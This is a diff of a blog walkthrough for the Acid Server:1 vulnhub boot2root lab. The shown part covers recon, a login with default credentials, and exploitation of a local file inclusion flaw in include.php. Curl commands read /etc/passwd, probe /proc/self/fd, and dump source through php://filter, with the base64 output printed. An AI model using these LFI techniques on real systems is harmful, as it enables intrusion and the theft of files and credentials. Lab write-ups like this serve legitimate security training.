@@ -5,13 +5,13 @@
 <!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
 <head>
   <meta charset="utf-8">
-  <title>Acid Server: 1 Walkthrough - andrewemil's blog</title>
+  <title>Acid Server:1 Walkthrough - Andrew Emil's blog</title>
   <meta name="author" content="Andrew Emil">
 
   
-  <meta name="description" content="Acid Server is a boot2root challenge built by Avinash
+  <meta name="description" content="Acid Server is a boot2root challenge built by @m_avinash143
 and hosted by vulnhub.
-The challenge is completely focused on web exploitation and the end goal &hellip;">
+The challenge is completely focused on web exploitation and the &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -20,10 +20,10 @@ The challenge is completely focused on web exploitation and the end goal &hellip
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
   
-  <link rel="canonical" href="http://andrewemil.github.io/blog/2015/08/22/acid-server-1-walkthrough/">
+  <link rel="canonical" href="http://andrewemil.github.io/blog/2015/08/24/acid-server-1-walkthrough/">
   <link href="/favicon.png" rel="icon">
   <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
-  <link href="/atom.xml" rel="alternate" title="andrewemil's blog" type="application/atom+xml">
+  <link href="/atom.xml" rel="alternate" title="Andrew Emil's blog" type="application/atom+xml">
   <script src="/javascripts/modernizr-2.0.js"></script>
   <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
   <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
@@ -53,7 +53,7 @@ The challenge is completely focused on web exploitation and the end goal &hellip
 
 <body   >
   <header role="banner"><hgroup>
-  <h1><a href="/">andrewemil's blog</a></h1>
+  <h1><a href="/">Andrew Emil's blog</a></h1>
   
 </hgroup>
 
@@ -84,7 +84,7 @@ The challenge is completely focused on web exploitation and the end goal &hellip
   
   <header>
     
-      <h1 class="entry-title">Acid Server: 1 Walkthrough</h1>
+      <h1 class="entry-title">Acid Server:1 Walkthrough</h1>
     
     
       <p class="meta">
@@ -93,19 +93,20 @@ The challenge is completely focused on web exploitation and the end goal &hellip
 
 
 
-<time class='entry-date' datetime='2015-08-22T15:58:42-04:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>22</span><span class='date-suffix'>nd</span>, <span class='date-year'>2015</span></span> <span class='time'>3:58 pm</span></time>
+<time class='entry-date' datetime='2015-08-24T17:16:43-04:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>24</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>5:16 pm</span></time>
         
       </p>
     
   </header>
 
 
-<div class="entry-content"><p><a href="https://www.vulnhub.com/entry/acid-server-1,125/">Acid Server</a> is a boot2root challenge built by <a href="https://twitter.com/@m_avinash143">Avinash</a>
-and hosted by <a href="https://www.vulnhub.com">vulnhub</a>.
-The challenge is completely focused on web exploitation and the end goal is to escalate the privileges to root and capture the flag.
-This walkthrough shows how I solved the challenge so let the fun begin!</p>
+<div class="entry-content"><p><a href="https://www.vulnhub.com/entry/acid-server-1,125/">Acid Server</a> is a boot2root challenge built by <a href="https://twitter.com/@m_avinash143">@m_avinash143</a>
+and hosted by <a href="https://www.vulnhub.com/entry/acid-server-1,125/">vulnhub</a>.
+The challenge is completely focused on web exploitation and the end goal is to escalate the privileges to root and capture the flag.</p>
 
-<p>After booting Acid Server and Kali on virtual box (Bridged Adapter), I used netdiscover to find the ip address of Acid server:</p>
+<p>This walkthrough shows how I solved the challenge, so lets get started.</p>
+
+<p>After booting Acid Server and Kali Linux on virtual box (Bridged Adapter), I used netdiscover to find the ip address of Acid server:</p>
 
 <figure class='code'><figcaption><span>Netdiscover</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -132,9 +133,9 @@ This walkthrough shows how I solved the challenge so let the fun begin!</p>
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>So, Acid&rsquo;t ip address is 192.168.2.102 and our kalis ip address is 192.168.2.108 as shown below:</p>
+<p>So, Acid&rsquo;s ip address is 192.168.2.102 and our kali&rsquo;s ip address is 192.168.2.108 as shown below:</p>
 
-<figure class='code'><figcaption><span>Kali's Ip Address</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
@@ -157,23 +158,23 @@ This walkthrough shows how I solved the challenge so let the fun begin!</p>
 </span><span class='line'>          inet addr:192.168.2.108  Bcast:192.168.2.255  Mask:255.255.255.0
 </span><span class='line'>          inet6 addr: fe80::a00:27ff:fe4b:6e05/64 Scope:Link
 </span><span class='line'>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
-</span><span class='line'>          RX packets:74436 errors:0 dropped:0 overruns:0 frame:0
-</span><span class='line'>          TX packets:71879 errors:0 dropped:0 overruns:0 carrier:0
+</span><span class='line'>          RX packets:16990 errors:0 dropped:0 overruns:0 frame:0
+</span><span class='line'>          TX packets:18055 errors:0 dropped:0 overruns:0 carrier:0
 </span><span class='line'>          collisions:0 txqueuelen:1000
-</span><span class='line'>          RX bytes:64902394 <span class="o">(</span>61.8 MiB<span class="o">)</span>  TX bytes:10008245 <span class="o">(</span>9.5 MiB<span class="o">)</span>
+</span><span class='line'>          RX bytes:14682497 <span class="o">(</span>14.0 MiB<span class="o">)</span>  TX bytes:2634672 <span class="o">(</span>2.5 MiB<span class="o">)</span>
 </span><span class='line'>
 </span><span class='line'>lo        Link encap:Local Loopback
 </span><span class='line'>          inet addr:127.0.0.1  Mask:255.0.0.0
 </span><span class='line'>          inet6 addr: ::1/128 Scope:Host
 </span><span class='line'>          UP LOOPBACK RUNNING  MTU:65536  Metric:1
-</span><span class='line'>          RX packets:3374 errors:0 dropped:0 overruns:0 frame:0
-</span><span class='line'>          TX packets:3374 errors:0 dropped:0 overruns:0 carrier:0
+</span><span class='line'>          RX packets:560 errors:0 dropped:0 overruns:0 frame:0
+</span><span class='line'>          TX packets:560 errors:0 dropped:0 overruns:0 carrier:0
 </span><span class='line'>          collisions:0 txqueuelen:0
-</span><span class='line'>          RX bytes:3370707 <span class="o">(</span>3.2 MiB<span class="o">)</span>  TX bytes:3370707 <span class="o">(</span>3.2 MiB<span class="o">)</span>
+</span><span class='line'>          RX bytes:4029744 <span class="o">(</span>3.8 MiB<span class="o">)</span>  TX bytes:4029744 <span class="o">(</span>3.8 MiB<span class="o">)</span>
 </span></code></pre></td></tr></table></div></figure>
 
 
-<h3>Nmap</h3>
+<h3>Enumeration</h3>
 
 <p>Lets find what services are running on Acid using nmap:</p>
 
@@ -224,21 +225,20 @@ This walkthrough shows how I solved the challenge so let the fun begin!</p>
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>Nmap found that apache web server was running on port 33447,so lets visit the main index page for the web service <a href="http://192.168.2.102:33447/">http://192.168.2.102:33447/</a></p>
+<p>Nmap found that apache web server is running on port 33447, so lets visit the main page for the web service <a href="http://192.168.2.102:33447/">http://192.168.2.102:33447/</a></p>
 
 <p><img class="center" src="/images/2015/1/image 1.png"></p>
 
-<p>It seems that there isn&rsquo;t anything useful here, so my next destination was dirbuster to find any hidden directories or files that might be interesting:</p>
+<p>My next destination was DirBuster to find hidden directories or files that might be interesting:</p>
 
-<p>Note:I used directory-list-2.3-medium.txt wordlist which is located in /usr/share/dirbuster/wordlist/</p>
+<p><img class="center" src="/images/2015/1/image 2.png">
+<em>Note: I used directory-list-2.3-medium.txt wordlist which is located in /usr/share/dirbuster/wordlists/</em></p>
 
-<p><img class="center" src="/images/2015/1/image 2.png"></p>
-
-<p>So, Dirbuster found a new directory named &ldquo;Challenge&rdquo;, and the index page &ldquo;<a href="http://192.168.2.102:33447/Challenge/js/index.js">http://192.168.2.102:33447/Challenge/js/index.js</a>&rdquo; of this directory is a login form as we can see:</p>
+<p>So, DirBuster has found the &ldquo;/Challenge&rdquo; directory, and the index page of this directory is a login form as we can see:</p>
 
 <p><img class="center" src="/images/2015/1/image 3.png"></p>
 
-<p>Lets examine the page source to see if we can identify the script behind this login form:</p>
+<p>Lets view the page source to see if we can identify the script behind this login form:</p>
 
 <p><img class="center" src="/images/2015/1/image 4.png"></p>
 
@@ -256,7 +256,7 @@ This walkthrough shows how I solved the challenge so let the fun begin!</p>
 
 
 <p>After searching for the login script in google using keywords &ldquo;secure login peredur.net&rdquo;, I found its main <a href="https://github.com/peredurabefrog/phpSecureLogin">github repository</a> and the default dabtabase
-is configured with a default user &ldquo;test_user&rdquo; as you can see in the description of the github repo:</p>
+is configured with a default user &ldquo;test_user&rdquo; as we can see in the description of the github repo, so lets try to login using these credentials:</p>
 
 <figure class='code'><figcaption><span>snippet from phpsecurelogin repo</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -267,47 +267,49 @@ is configured with a default user &ldquo;test_user&rdquo; as you can see in the 
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>After logging into the admin panel using the test_user credentials, there is a sec_session_id cookie assigned which I will use it later along aside with the cURL utility:</p>
+<p>After logging into the admin panel using the test_user credentials, there is a sec_session_id cookie assigned after a successful login which I will use later when I continue exploitation using the cURL utility.</p>
 
-<p><a href="http://192.168.2.102:33447/Challenge/protected_page.php">http://192.168.2.102:33447/Challenge/protected_page.php</a></p>
+<p>After we login,  we are directed to <a href="http://192.168.2.102:33447/Challenge/protected_page.php">http://192.168.2.102:33447/Challenge/protected_page.php</a> :</p>
 
 <p><img class="center" src="/images/2015/1/image 5.png"></p>
 
-<p>We can see session cookie assigned using <a href="https://addons.mozilla.org/ar/firefox/addon/live-http-headers/">Live Http Headers</a> firefox add-on:</p>
+<p>And we can see the assigned session cookie using <a href="https://addons.mozilla.org/ar/firefox/addon/live-http-headers/">Live Http Headers</a> firefox add-on:</p>
 
 <p>Set-Cookie: sec_session_id=64uk8pthsvr3939mm9joa5u254; path=/; HttpOnly</p>
 
 <p><img class="center" src="/images/2015/1/image 6.png"></p>
 
-<p><a href="http://192.168.2.102:33447/Challenge/include.php">http://192.168.2.102:33447/Challenge/include.php</a></p>
+<p>The &ldquo;Click Here to Proceed Further&rdquo; link direct us to <a href="http://192.168.2.102:33447/Challenge/include.php,">http://192.168.2.102:33447/Challenge/include.php,</a> which is a php script that allows us to include any readable file by the apache&rsquo;s user in the system.</p>
+
+<p>In another words we have Local File Inclusion vulnerability in our hands, I also tried to include remote files but it didn&rsquo;t work.</p>
 
 <p><img class="center" src="/images/2015/1/image 7.png"></p>
 
-<p>Reading /etc/passwd</p>
+<p>Lets try to read the /etc/passwd file:</p>
 
-<p><a href="http://192.168.2.102:33447/Challenge/include.php?file=%2Fetc%2Fpasswd&amp;add=Extract+File">http://192.168.2.102:33447/Challenge/include.php?file=%2Fetc%2Fpasswd&amp;add=Extract+File</a></p>
-
-<p><img class="center" src="/images/2015/1/image 8.png"></p>
-
-<p>At this point, I tried to get RCE using the LFI vulnerability by using apache log poisining, reading /proc/self/environ, or any logs in the file descriptor.
-But it seems the apache user doesn&rsquo;t have any read access on those files and only php://filter wrappter worked which is very useful to further enumerate
-the php files
-There is only one readable file descriptor  /proc/self/fd/14 but I found later after examining the files that it includes only php sessions which weren'y controlable by any mean so it was usless.</p>
-
-<h3>File Descriptor 14:</h3>
-
-<figure class='code'><figcaption><span>/proc/self/fd/14</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl -s --cookie <span class="s2">&quot;sec_session_id=64uk8pthsvr3939mm9joa5u254&quot;</span> http://192.168.2.102:33447/Challenge/include.php?file<span class="o">=</span><span class="k">$(</span>php -r <span class="s2">&quot;echo urlencode(&#39;/proc/self/fd/14&#39;);&quot;</span><span class="k">)</span> <span class="p">|</span> sed  <span class="s1">&#39;/&lt;html&gt;/,/*/d&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;&lt;&#39;</span> -f 1
-</span><span class='line'>
-</span><span class='line'>index_page<span class="p">|</span>i:1440350358<span class="p">;</span>user_id<span class="p">|</span>s:1:<span class="s2">&quot;1&quot;</span><span class="p">;</span>username<span class="p">|</span>s:9:<span class="s2">&quot;test_user&quot;</span><span class="p">;</span>login_string<span class="p">|</span>s:128:<span class="s2">&quot;8cc28bf7a16672373346a20752ed5f7e5988d7ee63787ba06daeaa1e0cdbaa74c463ca52eb96ed6a2a4431b2c748671b7de162aa2da4d7e395791ad1d4d03d39&quot;</span><span class="p">;</span>protected_page<span class="p">|</span>i:1440350424<span class="p">;</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>http://192.168.2.102:33447/Challenge/include.php?file<span class="o">=</span>%2Fetc%2Fpasswd<span class="p">&amp;</span><span class="nv">add</span><span class="o">=</span>Extract+File
 </span></code></pre></td></tr></table></div></figure>
 
 
-<h3>include.php source:</h3>
+<p><img class="center" src="/images/2015/1/image 8.png"></p>
 
-<figure class='code'><figcaption><span>include.php source code </span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<p>So, This is an absolute path LFI.</p>
+
+<p>At this point, I tried to get RCE using the LFI vulnerability by using apache log poisoning method, reading /proc/self/environ, or any logs in the apache&rsquo;s file descriptors,
+but it seems that the apache user doesn&rsquo;t have any read access on those files and only <strong>php://filter</strong> meta-wrapper worked which is very useful for further enumeration of any readable files in the target system.</p>
+
+<p><em>php://filter is a kind of meta-wrapper designed to permit the application of filters to a stream at the time of opening, and forces PHP to base64 encode the file before it is used in the include statement, so we can examine its source code.</em></p>
+
+<p><em>There is only one readable file descriptor /proc/self/fd/14 which I found using BurbSuit(Intruder attack combined with Numbers payload) and by brutefocing the file descriptor number utilizing the include.php script, but I found later after enumerating the files in the web server that this file descriptor only contains php session variables which aren&rsquo;t controlable by any mean, so it was useless.</em></p>
+
+<p><img class="center" src="/images/2015/1/image 9.png"></p>
+
+<h3>Files Enumeration using PHP://filter</h3>
+
+<p>Lets go to the next step and start enumerating the underlying files in the current directory, and we will start by <em>include.php</em>:</p>
+
+<figure class='code'><figcaption><span>bas64 of include.php source code</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
@@ -322,27 +324,29 @@ There is only one readable file descriptor  /proc/self/fd/14 but I found later a
 <span class='line-number'>13</span>
 <span class='line-number'>14</span>
 <span class='line-number'>15</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl -s --cookie <span class="s2">&quot;sec_session_id=64uk8pthsvr3939mm9joa5u254&quot;</span> http://192.168.2.102:33447/Challenge/include.php?file<span class="o">=</span><span class="k">$(</span>php -r <span class="s2">&quot;echo urlencode(&#39;php://filter/convert.base64-encode/resource=include.php&#39;);&quot;</span><span class="k">)</span> <span class="p">|</span> sed  <span class="s1">&#39;/&lt;html&gt;/,/*/d&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;&lt;&#39;</span> -f 1
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl -s --cookie <span class="s2">&quot;sec_session_id=pdn8qkd0v8ukgpdpcip10n00b5&quot;</span> http://192.168.2.102:33447/Challenge/include.php?file<span class="o">=</span><span class="k">$(</span>php -r <span class="s2">&quot;echo urlencode(&#39;php://filter/convert.base64-encode/resource=include.php&#39;);&quot;</span><span class="k">)</span> <span class="p">|</span> sed  <span class="s1">&#39;/&lt;html&gt;/,/*/d&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;&lt;&#39;</span> -f 1
 </span><span class='line'>
-</span><span class='line'>PD9waHAKaW5jbHVkZV9vbmNlICdpbmNsdWRlcy9kYl9jb25uZWN0LnBocCc7CmluY2x1ZGVfb25jZSAnaW5jbHVkZXMvZnVuY3Rpb25zLnBocCc7CgpzZWNfc2Vzc2lvbl9zdGFyd
-</span><span class='line'>CgpOwokX1NFU1NJT05bJ2xvbCddPXRpbWUoKTsKCmlmICghaXNzZXQoJF9TRVNTSU9OWydwcm90ZWN0ZWRfcGFnZSddKSl7CiAgICAgICAgaGVhZGVyKCdMb2NhdGlvbjogcHJvdG
-</span><span class='line'>VjdGVkX3BhZ2UucGhwJyk7CiAgICAgICAgZXhpdDsKfQppZiAoIWlzc2V0KCRfU0VTU0lPTlsnaW5kZXhfcGFnZSddKSl7CiAgICAgICAgaGVhZGVyKCdMb2NhdGlvbjogcHJvdGV
-</span><span class='line'>jdGVkX3BhZ2UucGhwJyk7CiAgICAgICAgZXhpdDsKfQo/PgoKPD9waHAgCiRmaWxlID0gJF9HRVRbJ2ZpbGUnXTsKaW5jbHVkZSgkZmlsZSk7Cj8+CjwhRE9DVFlQRSBodG1sPgo8
-</span><span class='line'>aHRtbD4KICAgICAgICA8aGVhZD4KICAgICAgICAgICAgICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICAgICAgICAgICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZ
-</span><span class='line'>j0iY3NzL3N0eWxlLmNzcyI+CiAgICAgICAgICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9InN0eWxlcy9tYWluLmNzcyIgLz4KICAgICAgICAgICAgICAgIDx0aX
-</span><span class='line'>RsZT5UcnkgdG8gRXh0cmFjdCBKdWljeSBkZXRhaWxzPC90aXRsZT4KICAgICAgICA8L2hlYWQ+CiAgICAgICAgPGJvZHk+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJ3cmF
-</span><span class='line'>wcGVyIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KCQkJCTxwPiA8aDE+SG1tLi4uSXQgbG9va3MgbGlrZSB0aGF0IHlvdSBrbm93IHlv
-</span><span class='line'>dXIgdGhpbmdzPC9oMT4gPGJyPiAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8Zm9ybSBtZXRob2Q9ImdldCIgYWN0aW9uPSI8P3BocCAkX1BIUF9TRUxGID8+Ij4KI
-</span><span class='line'>CAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbnRlciB0aGUgRmlsZSBuYW1lOjxpbnB1dCBuYW1lPSJmaWxlIiBwbGFjZWhvbGRlcj0iRmlsZSBOYW1lIiB0eXBlPSJ0ZX
-</span><span class='line'>h0IiBpZD0iaWQiIG1heGxlbmd0aD0iMjAiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCBuYW1lPSJhZGQiIHR5cGU9InN1Ym1pdCIgaWQ9ImFkZCIgdmF
-</span><span class='line'>sdWU9IkV4dHJhY3QgRmlsZSI+CiAgPC9ib2R5Pgo8L2h0bWw+CgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCjwhLS0weDU5MzM1NjZhNGM2
-</span><span class='line'><span class="nv">ZTRhMzQ2MjZlNDEzZC0tPgo</span><span class="o">=</span>
+</span><span class='line'>PD9waHAKaW5jbHVkZV9vbmNlICdpbmNsdWRlcy9kYl9jb25uZWN0LnBocCc7CmluY2x1ZGVfb25jZSAnaW5jbHVkZXMvZnVuY3Rpb25zLnBocCc7CgpzZWNfc2Vzc2lvbl9zdGF
+</span><span class='line'>ydCgpOwokX1NFU1NJT05bJ2xvbCddPXRpbWUoKTsKCmlmICghaXNzZXQoJF9TRVNTSU9OWydwcm90ZWN0ZWRfcGFnZSddKSl7CiAgICAgICAgaGVhZGVyKCdMb2NhdGlvbjogcH
+</span><span class='line'>JvdGVjdGVkX3BhZ2UucGhwJyk7CiAgICAgICAgZXhpdDsKfQppZiAoIWlzc2V0KCRfU0VTU0lPTlsnaW5kZXhfcGFnZSddKSl7CiAgICAgICAgaGVhZGVyKCdMb2NhdGlvbjogc
+</span><span class='line'>HJvdGVjdGVkX3BhZ2UucGhwJyk7CiAgICAgICAgZXhpdDsKfQo/PgoKPD9waHAgCiRmaWxlID0gJF9HRVRbJ2ZpbGUnXTsKaW5jbHVkZSgkZmlsZSk7Cj8+CjwhRE9DVFlQRSBo
+</span><span class='line'>dG1sPgo8aHRtbD4KICAgICAgICA8aGVhZD4KICAgICAgICAgICAgICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICAgICAgICAgICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGV
+</span><span class='line'>ldCIgaHJlZj0iY3NzL3N0eWxlLmNzcyI+CiAgICAgICAgICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9InN0eWxlcy9tYWluLmNzcyIgLz4KICAgICAgICAgIC
+</span><span class='line'>AgICAgIDx0aXRsZT5UcnkgdG8gRXh0cmFjdCBKdWljeSBkZXRhaWxzPC90aXRsZT4KICAgICAgICA8L2hlYWQ+CiAgICAgICAgPGJvZHk+CiAgICAgICAgICAgICAgICA8ZGl2I
+</span><span class='line'>GNsYXNzPSJ3cmFwcGVyIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KCQkJCTxwPiA8aDE+SG1tLi4uSXQgbG9va3MgbGlrZSB0aGF0
+</span><span class='line'>IHlvdSBrbm93IHlvdXIgdGhpbmdzPC9oMT4gPGJyPiAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8Zm9ybSBtZXRob2Q9ImdldCIgYWN0aW9uPSI8P3BocCAkX1B
+</span><span class='line'>IUF9TRUxGID8+Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbnRlciB0aGUgRmlsZSBuYW1lOjxpbnB1dCBuYW1lPSJmaWxlIiBwbGFjZWhvbGRlcj0iRmlsZS
+</span><span class='line'>BOYW1lIiB0eXBlPSJ0ZXh0IiBpZD0iaWQiIG1heGxlbmd0aD0iMjAiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCBuYW1lPSJhZGQiIHR5cGU9InN1Y
+</span><span class='line'>m1pdCIgaWQ9ImFkZCIgdmFsdWU9IkV4dHJhY3QgRmlsZSI+CiAgPC9ib2R5Pgo8L2h0bWw+CgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoK
+</span><span class='line'><span class="nv">CjwhLS0weDU5MzM1NjZhNGM2ZTRhMzQ2MjZlNDEzZC0tPgo</span><span class="o">=</span>
 </span></code></pre></td></tr></table></div></figure>
 
 
-<h3>Decoded to:</h3>
+<p><em>Note: In the cURL command, I used urlencode() function in php to send urlencoded input in the &ldquo;file&rdquo; GET variable. I also used sed and cut commands to get rid of the html code in the output</em>.</p>
 
-<figure class='code'><figcaption><span>Decoding the base64 of include.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<p>After decoding the base64 of the include.php source code, nothing useful was found except that we can see how our files are included in the script using <em>include($file);</em>:</p>
+
+<figure class='code'><figcaption><span>include.php source code</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
@@ -393,19 +397,19 @@ There is only one readable file descriptor  /proc/self/fd/14 but I found later a
 <span class='line-number'>49</span>
 <span class='line-number'>50</span>
 <span class='line-number'>51</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# <span class="nb">echo </span>PD9waHAKaW5jbHVkZV9vbmNlICdpbmNsdWRlcy9kYl9jb25uZWN0LnBocCc7CmluY2x1ZGVfb25jZSAnaW5jbHVkZXMvZnVuY3Rpb25zLnBocCc7CgpzZWN
-</span><span class='line'>fc2Vzc2lvbl9zdGFydCgpOwokX1NFU1NJT05bJ2xvbCddPXRpbWUoKTsKCmlmICghaXNzZXQoJF9TRVNTSU9OWydwcm90ZWN0ZWRfcGFnZSddKSl7CiAgICAgICAgaGVhZGVyKCdM
-</span><span class='line'>b2NhdGlvbjogcHJvdGVjdGVkX3BhZ2UucGhwJyk7CiAgICAgICAgZXhpdDsKfQppZiAoIWlzc2V0KCRfU0VTU0lPTlsnaW5kZXhfcGFnZSddKSl7CiAgICAgICAgaGVhZGVyKCdMb
-</span><span class='line'>2NhdGlvbjogcHJvdGVjdGVkX3BhZ2UucGhwJyk7CiAgICAgICAgZXhpdDsKfQo/PgoKPD9waHAgCiRmaWxlID0gJF9HRVRbJ2ZpbGUnXTsKaW5jbHVkZSgkZmlsZSk7Cj8+CjwhRE
-</span><span class='line'>9DVFlQRSBodG1sPgo8aHRtbD4KICAgICAgICA8aGVhZD4KICAgICAgICAgICAgICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICAgICAgICAgICAgICAgIDxsaW5rIHJlbD0ic3R
-</span><span class='line'>5bGVzaGVldCIgaHJlZj0iY3NzL3N0eWxlLmNzcyI+CiAgICAgICAgICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9InN0eWxlcy9tYWluLmNzcyIgLz4KICAgICAg
-</span><span class='line'>ICAgICAgICAgIDx0aXRsZT5UcnkgdG8gRXh0cmFjdCBKdWljeSBkZXRhaWxzPC90aXRsZT4KICAgICAgICA8L2hlYWQ+CiAgICAgICAgPGJvZHk+CiAgICAgICAgICAgICAgICA8Z
-</span><span class='line'>Gl2IGNsYXNzPSJ3cmFwcGVyIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KCQkJCTxwPiA8aDE+SG1tLi4uSXQgbG9va3MgbGlrZSB0aG
-</span><span class='line'>F0IHlvdSBrbm93IHlvdXIgdGhpbmdzPC9oMT4gPGJyPiAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8Zm9ybSBtZXRob2Q9ImdldCIgYWN0aW9uPSI8P3BocCAkX1B
-</span><span class='line'>IUF9TRUxGID8+Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbnRlciB0aGUgRmlsZSBuYW1lOjxpbnB1dCBuYW1lPSJmaWxlIiBwbGFjZWhvbGRlcj0iRmlsZSBO
-</span><span class='line'>YW1lIiB0eXBlPSJ0ZXh0IiBpZD0iaWQiIG1heGxlbmd0aD0iMjAiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCBuYW1lPSJhZGQiIHR5cGU9InN1Ym1pd
-</span><span class='line'>CIgaWQ9ImFkZCIgdmFsdWU9IkV4dHJhY3QgRmlsZSI+CiAgPC9ib2R5Pgo8L2h0bWw+CgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCjwhLS
-</span><span class='line'><span class="nv">0weDU5MzM1NjZhNGM2ZTRhMzQ2MjZlNDEzZC0tPgo</span><span class="o">=</span> <span class="p">|</span> base64 --decode
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# <span class="nb">echo </span>PD9waHAKaW5jbHVkZV9vbmNlICdpbmNsdWRlcy9kYl9jb25uZWN0LnBocCc7CmluY2x1ZGVfb25jZSAnaW5jbHVkZXMvZnVuY3Rpb25zLnBocCc7CgpzZ
+</span><span class='line'>WNfc2Vzc2lvbl9zdGFydCgpOwokX1NFU1NJT05bJ2xvbCddPXRpbWUoKTsKCmlmICghaXNzZXQoJF9TRVNTSU9OWydwcm90ZWN0ZWRfcGFnZSddKSl7CiAgICAgICAgaGVhZGVy
+</span><span class='line'>KCdMb2NhdGlvbjogcHJvdGVjdGVkX3BhZ2UucGhwJyk7CiAgICAgICAgZXhpdDsKfQppZiAoIWlzc2V0KCRfU0VTU0lPTlsnaW5kZXhfcGFnZSddKSl7CiAgICAgICAgaGVhZGV
+</span><span class='line'>yKCdMb2NhdGlvbjogcHJvdGVjdGVkX3BhZ2UucGhwJyk7CiAgICAgICAgZXhpdDsKfQo/PgoKPD9waHAgCiRmaWxlID0gJF9HRVRbJ2ZpbGUnXTsKaW5jbHVkZSgkZmlsZSk7Cj
+</span><span class='line'>8+CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KICAgICAgICA8aGVhZD4KICAgICAgICAgICAgICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICAgICAgICAgICAgICAgIDxsaW5rI
+</span><span class='line'>HJlbD0ic3R5bGVzaGVldCIgaHJlZj0iY3NzL3N0eWxlLmNzcyI+CiAgICAgICAgICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9InN0eWxlcy9tYWluLmNzcyIg
+</span><span class='line'>Lz4KICAgICAgICAgICAgICAgIDx0aXRsZT5UcnkgdG8gRXh0cmFjdCBKdWljeSBkZXRhaWxzPC90aXRsZT4KICAgICAgICA8L2hlYWQ+CiAgICAgICAgPGJvZHk+CiAgICAgICA
